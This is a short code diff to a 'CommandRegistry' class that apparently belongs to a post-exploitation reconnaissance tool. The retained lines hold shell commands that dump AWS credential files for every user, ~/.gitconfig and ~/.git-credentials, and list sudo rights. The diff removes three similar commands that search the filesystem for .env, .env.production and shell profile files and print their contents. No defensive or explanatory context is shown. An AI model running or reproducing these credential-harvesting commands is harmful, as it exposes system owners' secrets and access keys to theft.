@@ -955,10 +955,6 @@ class CommandRegistry:
             "aws_all_users": ("bash", "-c", "find /home /root -path '*/.aws/credentials' -o -path '*/.aws/config' 2>/dev/null -exec sh -c 'echo \"=== {} ===\"; cat \"{}\"' \\;"),
             "git_config": ("cat", "~/.gitconfig"),
             "git_credentials": ("cat", "~/.git-credentials"),
-            # ============ ENVIRONMENT & CREDENTIALS ============
-            "cat_env_files": ("bash", "-c", "find / -maxdepth 4 -name '.env' 2>/dev/null -exec sh -c 'echo \"=== {} ===\"; cat \"{}\"' \\;"),
-            "cat_env_local": ("bash", "-c", "find /var/www /opt /srv -name '.env.local' -o -name '.env.production' 2>/dev/null -exec sh -c 'echo \"=== {} ===\"; cat \"{}\"' \\;"),
-            "cat_profile_files": ("bash", "-c", "find /home -name '.profile' -o -name '.bashrc' -o -name '.bash_profile' 2>/dev/null -exec sh -c 'echo \"=== {} ===\"; cat \"{}\"' \\;"),
             # ============ SECURITY CONTROLS ============
             "sudo_version": ("sudo", "-V"),
             "sudo_list": ("sudo", "-l"),
